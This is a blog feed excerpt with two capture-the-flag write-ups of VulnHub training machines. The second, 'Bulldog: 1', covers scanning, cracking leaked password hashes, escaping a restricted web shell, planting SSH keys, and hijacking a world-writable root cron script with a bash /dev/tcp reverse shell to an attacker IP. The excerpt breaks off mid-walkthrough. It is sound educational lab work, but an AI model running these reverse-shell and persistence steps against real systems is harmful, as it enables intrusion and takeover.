-rw-r--r-- 1 root root    5 juin   5 13:40 peda-session-overflow.txt
-rw-r--r-- 1 hadi hadi  675 avril 26  2017 .profile
drwxr-xr-x 2 hadi hadi 4,0K mai    1  2017 .ssh
&amp;amp;lt;SNIP&amp;amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Okay we got a program &lt;code&gt;buff&lt;/code&gt; owned by root and and file &lt;code&gt;buff.c&lt;/code&gt; readable by anybody but there is no suid, so no need to bother here.
&lt;code&gt;martin@debian:/home/hadi$ ls -laRh /etc/cron.d&lt;/code&gt; doesn't get us something useful but &lt;code&gt;cat /etc/crontab&lt;/code&gt; seems usable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;martin@debian:/home/hadi$ cat /etc/crontab 
&amp;amp;lt;SNIP&amp;amp;gt;
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;amp;amp;&amp;amp;amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;amp;&amp;amp;amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;amp;&amp;amp;amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;amp;&amp;amp;amp; run-parts --report /etc/cron.monthly )
*/5   * * * *   jimmy   python /tmp/sekurity.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Of course the script launch by jimmy in &lt;code&gt;tmp&lt;/code&gt; doesn't exist. We create one with a simple python reverse shell &lt;a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;pentest monkey&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# nc -l -p 1234
/bin/sh: 0: can&amp;#39;t access tty; job control turned off
$ id
uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We add our ssh key to be able to connect with ssh:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;cd&lt;/span&gt; &lt;span class="sr"&gt;/home/&lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;
&lt;span class="nv"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;mkdir&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;
&lt;span class="nv"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;cat&lt;/span&gt; &lt;span class="sr"&gt;/home/m&lt;/span&gt;&lt;span class="n"&gt;artin&lt;/span&gt;&lt;span class="sr"&gt;/.ssh/&lt;/span&gt;&lt;span class="n"&gt;authorized_keys&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="ow"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;authorized_keys&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There is binary &lt;code&gt;networker&lt;/code&gt; owned by root with an suid in our home directory (well jimmy's):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;jimmy@debian:~$ ls -al
total 36
drwx------ 3 jimmy jimmy 4096 nov.  17 10:30 .
drwxr-xr-x 5 root  root  4096 juin   9 20:17 ..
-rw-r--r-- 1 root  root    16 juin   9 20:40 .bash_history
-rw-r--r-- 1 jimmy jimmy  220 juin   8 21:07 .bash_logout
-rw-r--r-- 1 jimmy jimmy 3515 juin   8 21:07 .bashrc
-rwsrwxrwx 1 root  root  7496 juin   9 20:00 networker
-rw-r--r-- 1 jimmy jimmy  675 juin   8 21:07 .profile
drwxr-xr-x 2 jimmy jimmy 4096 nov.  17 10:31 .ssh
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It seems to give information about the network configuration, ping localhost and and echo "echo linux tool version 5":&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;jimmy@debian:~$ ./networker 
*** Networker 2.0 *** 
eth0      Link encap:Ethernet  HWaddr 08:00:27:84:43:c4  
    inet adr:10.0.2.5  Bcast:10.0.2.255  Masque:255.255.255.0
    adr inet6: fe80::a00:27ff:fe84:43c4/64 Scope:Lien
    UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
    RX packets:3934 errors:0 dropped:0 overruns:0 frame:0
    TX packets:2705 errors:0 dropped:0 overruns:0 carrier:0
    collisions:0 lg file transmission:1000 
    RX bytes:331724 (323.9 KiB)  TX bytes:398743 (389.3 KiB)
    Interruption:9 Adresse de base:0xd020

lo        Link encap:Boucle locale  
    inet adr:127.0.0.1  Masque:255.0.0.0
    adr inet6: ::1/128 Scope:HÃ´te
    UP LOOPBACK RUNNING  MTU:65536  Metric:1
    RX packets:6 errors:0 dropped:0 overruns:0 frame:0
    TX packets:6 errors:0 dropped:0 overruns:0 carrier:0
    collisions:0 lg file transmission:0 
    RX bytes:504 (504.0 B)  TX bytes:504 (504.0 B)

PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.012 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.012/0.012/0.012/0.000 ms
Done 
echo linux tool version 5
Vous avez du nouveau courrier dans /var/mail/jimmy
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Getting the strings in the program give us the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;jimmy@debian:~$ strings networker 
&amp;amp;lt;SNIP&amp;amp;gt;
*** Networker 2.0 *** 
/sbin/ifconfig
/bin/ping -c 1  localhost 
Done 
echo &amp;#39;echo linux tool version 5&amp;#39;
&amp;amp;lt;SNIP&amp;amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So &lt;code&gt;ping&lt;/code&gt; and &lt;code&gt;ifconfig&lt;/code&gt; seem to be loaded from an absolute path but not the &lt;code&gt;echo&lt;/code&gt; command. We shall be able to
make our own echo binary and change the path to execute our binary (a reverse shell) instead of echo.&lt;/p&gt;
&lt;p&gt;But the binary use the absolute path and we didn't achieve to be root.
Let me know if you were able to get root from there (no bruteforce on the hadi user :D).&lt;/p&gt;
&lt;p&gt;Thanks to Hadi for the VM and thanks to vulnhub.&lt;/p&gt;</content><category term="security"></category><category term="vulnhub"></category></entry><entry><title>Vulnhub, Bulldog: 1</title><link href="https://matthieukeller.com/2017/11/vulnhub-bulldog-1.html" rel="alternate"></link><published>2017-11-10T19:10:00+01:00</published><updated>2017-11-10T19:10:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2017-11-10:/2017/11/vulnhub-bulldog-1.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2017.11/1.png" alt="Bulldog homepage" width="162"&gt;&lt;/p&gt;
&lt;p&gt;At the moment I have some times to work again on vulhub virtual machine. So here I picked
the first one at the moment:
&lt;a href="https://www.vulnhub.com/entry/bulldog-1,211/"&gt;Bulldog: 1&lt;/a&gt;
A simple boot2root machine by &lt;a href="https://twitter.com/frichette_n"&gt;Nick Frichette&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2017.11/1.png" alt="Bulldog homepage" width="162"&gt;&lt;/p&gt;
&lt;p&gt;At the moment I have some times to work again on vulhub virtual machine. So here I picked
the first one at the moment:
&lt;a href="https://www.vulnhub.com/entry/bulldog-1,211/"&gt;Bulldog: 1&lt;/a&gt;
A simple boot2root machine by &lt;a href="https://twitter.com/frichette_n"&gt;Nick Frichette&lt;/a&gt;.&lt;/p&gt;


&lt;h2&gt;Discovery&lt;/h2&gt;
&lt;p&gt;The MOTD of the machine give us its IP address so we can directly launch a nmap at it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# nmap -sSV 10.0.2.4

Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-09 14:00 CET
Nmap scan report for 10.0.2.4
Host is up (0.00057s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)
8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)
MAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There is a ssh service running on port 23 and two web servers on port 80 and
8080. The server on both port seems to be the same and talks dogs photographies.&lt;/p&gt;
&lt;h2&gt;Web&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Website screenshot" src="/media/2017.11/1.png"&gt;&lt;/p&gt;
&lt;p&gt;We run &lt;code&gt;dirb&lt;/code&gt; on the web server on the port 80:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# dirb http://10.0.2.4

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Nov  9 14:06:31 2017
URL_BASE: http://10.0.2.4/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.0.2.4/ ----
==&amp;amp;gt; DIRECTORY: http://10.0.2.4/admin/
==&amp;amp;gt; DIRECTORY: http://10.0.2.4/dev/
+ http://10.0.2.4/robots.txt (CODE:200|SIZE:1071)
&amp;amp;lt;SNIP&amp;amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The result is the same on the port 8080&lt;/p&gt;
&lt;p&gt;The admin page present a django login interface.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Django login page" src="/media/2017.11/2.png"&gt;&lt;/p&gt;
&lt;p&gt;The dev page contain the link to a web-shell and contact information with some hashes in html comments &lt;code&gt;view-source:http://10.0.2.4/dev/&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;Team&lt;/span&gt; &lt;span class="nt"&gt;Lead&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;alan&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;!&lt;/span&gt;&lt;span class="nt"&gt;--6515229daf8dbdc8b89fed2e60f107433da5f2cb--&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;Back-up&lt;/span&gt; &lt;span class="nt"&gt;Team&lt;/span&gt; &lt;span class="nt"&gt;Lead&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;william&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;!&lt;/span&gt;&lt;span class="nt"&gt;--38882f3b81f8f2bc47d9f3119155b05f954892fb--&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;Front&lt;/span&gt; &lt;span class="nt"&gt;End&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;malik&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;!&lt;/span&gt;&lt;span class="nt"&gt;--c6f7e34d5d08ba4a40dd5627508ccb55b425e279--&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;Front&lt;/span&gt; &lt;span class="nt"&gt;End&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;kevin&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;!&lt;/span&gt;&lt;span class="nt"&gt;--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9--&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;Back&lt;/span&gt; &lt;span class="nt"&gt;End&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;ashley&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;!&lt;/span&gt;&lt;span class="nt"&gt;--553d917a396414ab99785694afd51df3a8a8a3e0--&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;Back&lt;/span&gt; &lt;span class="nt"&gt;End&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;nick&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;!&lt;/span&gt;&lt;span class="nt"&gt;--ddf45997a7e18a25ad5f5cf222da64814dd060d5--&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;Database&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;sarah&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;!&lt;/span&gt;&lt;span class="nt"&gt;--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We launch john against the hashes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~/bulldog# john hashes --format=Raw-SHA1
Using default input encoding: UTF-8
Loaded 7 password hashes with no different salts (Raw-SHA1 [SHA1 128/128 AVX 4x])
Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status
bulldog          (nick)
1g 0:00:03:32  3/3 0.004714g/s 12965Kp/s 12965Kc/s 77831KC/s hmj359t..hmj359l
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nick use a weak password and it can be used to login into the Django admin interface but he has no access.&lt;/p&gt;
&lt;p&gt;[/media/2017.11/3.png]&lt;/p&gt;
&lt;p&gt;Nevertheless nick has access to the restricted web-shell&lt;/p&gt;
&lt;p&gt;[/media/2017.11/4.png]&lt;/p&gt;
&lt;p&gt;We can explore a bit, cat &lt;code&gt;/etc/passwd&lt;/code&gt; but mostly we can access the django secret key in bulldog/settings.py&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cat bulldog/settings.py
&amp;amp;lt;SNIP&amp;amp;gt;
# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = &amp;#39;%9a3ph3iwk$v*_#x4ejg8(t5(qll0fl8q8&amp;amp;amp;u+o_g$yi83d*riq&amp;#39;
&amp;amp;lt;SNIP&amp;amp;gt;o
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And we can easily break out of the "jail" with the &lt;code&gt;echo&lt;/code&gt; command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;echo `id`
uid=1001(django) gid=1001(django) groups=1001(django),27(sudo)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Therefore we can create a directory &lt;code&gt;.ssh&lt;/code&gt; inside the  django user home:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;echo `mkdir /home/django/.ssh`
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And then echo our ssh public key inside (you need to change the filed size with the firefox inspector):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;echo &amp;#39;ssh-rsa AAAAB3Nt/&amp;amp;lt;SNIP&amp;amp;gt;&amp;#39;&amp;amp;gt; /home/django/.ssh/authorized_keys
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we got an interactive shell with ssh:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh -ldjango 10.0.2.4 -p23
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;PrivEsc&lt;/h2&gt;
&lt;p&gt;By looking more into the users directory we discover that we have a read access on djangoadmin
files and that a &lt;code&gt;.hiddenadmindirectory&lt;/code&gt; is present with a note and an executable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;django@bulldog:~$ ls -ahlR /home
/home:
total 16K
drwxr-xr-x  4 root         root         4.0K Aug 24 18:16 .
drwxr-xr-x 24 root         root         4.0K Aug 25 22:07 ..
drwxr-xr-x  5 bulldogadmin bulldogadmin 4.0K Sep 20 19:45 bulldogadmin
drwxr-xr-x  6 django       django       4.0K Nov  9 09:43 django

/home/bulldogadmin:
total 40K
drwxr-xr-x 5 bulldogadmin bulldogadmin 4.0K Sep 20 19:45 .
drwxr-xr-x 4 root         root         4.0K Aug 24 18:16 ..
-rw-r--r-- 1 bulldogadmin bulldogadmin  220 Aug 24 17:39 .bash_logout
-rw-r--r-- 1 bulldogadmin bulldogadmin 3.7K Aug 24 17:39 .bashrc
drwx------ 2 bulldogadmin bulldogadmin 4.0K Aug 24 17:40 .cache
drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Sep 20 19:44 .hiddenadmindirectory
drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Aug 24 22:18 .nano
-rw-r--r-- 1 bulldogadmin bulldogadmin  655 Aug 24 17:39 .profile
-rw-rw-r-- 1 bulldogadmin bulldogadmin   66 Aug 24 22:18 .selected_editor
-rw-r--r-- 1 bulldogadmin bulldogadmin    0 Aug 24 17:45 .sudo_as_admin_successful
-rw-rw-r-- 1 bulldogadmin bulldogadmin  217 Aug 24 18:20 .wget-hsts
ls: cannot open directory &amp;#39;/home/bulldogadmin/.cache&amp;#39;: Permission denied

/home/bulldogadmin/.hiddenadmindirectory:
total 24K
drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Sep 20 19:44 .
drwxr-xr-x 5 bulldogadmin bulldogadmin 4.0K Sep 20 19:45 ..
-rw-r--r-- 1 bulldogadmin bulldogadmin 8.6K Aug 25 22:18 customPermissionApp
-rw-rw-r-- 1 bulldogadmin bulldogadmin  619 Sep 20 19:44 note
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Reverse&lt;/h3&gt;
&lt;p&gt;The note's content is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Nick,

I&amp;#39;m working on the backend permission stuff. Listen, it&amp;#39;s super prototype but I think it&amp;#39;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!

It&amp;#39;s great stuff! Once I&amp;#39;m finished with it, a hacker wouldn&amp;#39;t even be able to reverse it! Keep in mind that it&amp;#39;s still a prototype right now. I am about to get it working with the Django user account. I&amp;#39;m not sure how I&amp;#39;ll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?

Let me know what you think of it!

-Ashley
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We copy the executable to make it our own and be able to execute it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;django&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;bulldog&lt;/span&gt;&lt;span class="o"&gt;:~$&lt;/span&gt; &lt;span class="nt"&gt;cp&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;bulldogadmin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;hiddenadmindirectory&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;customPermissionApp&lt;/span&gt; &lt;span class="o"&gt;./&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;chmod&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;x&lt;/span&gt; &lt;span class="nt"&gt;customPermissionApp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then it's reverse, but another lead was found during the reconnaissance for privilege escalation:&lt;/p&gt;
&lt;h3&gt;Cron&lt;/h3&gt;
&lt;p&gt;By looking at the cron files we also see that there is a runAV task:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;django@bulldog:~$ ls -ahlR /etc/cron*
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 24K
drwxr-xr-x  2 root root 4.0K Aug 25 22:05 .
drwxr-xr-x 94 root root 4.0K Nov  9 06:38 ..
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  191 Aug 24 17:38 popularity-contest
-rw-r--r--  1 root root   54 Aug 25 22:05 runAV
&amp;amp;lt;SNIP&amp;amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;By digging in we found that:&lt;/p&gt;
&lt;p&gt;it run a script with root right every minute&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;django@bulldog:~$ cat /etc/cron.d/runAV 
*/1 * * * * root /.hiddenAVDirectory/AVApplication.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;the script is world writable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;django@bulldog:~$ ls -l /.hiddenAVDirectory/AVApplication.py 
-rwxrwxrwx 1 root root 157 Aug 25 22:12 /.hiddenAVDirectory/AVApplication.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;that the script is just a place holder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;django@bulldog:~$ cat /.hiddenAVDirectory/AVApplication.py
#!/usr/bin/env python

# Just wanted to throw this placeholder here really quick.
# We will put the full AV here when the vendor is done making it.
# - Alan
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can just get a reverse root shell by modifying the file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;django@bulldog:~$ cat /.hiddenAVDirectory/AVApplication.py
#!/bin/bash
bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/10.0.2.15/4444 0&amp;amp;gt;&amp;amp;amp;1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And listen client side:&lt;/p&gt;
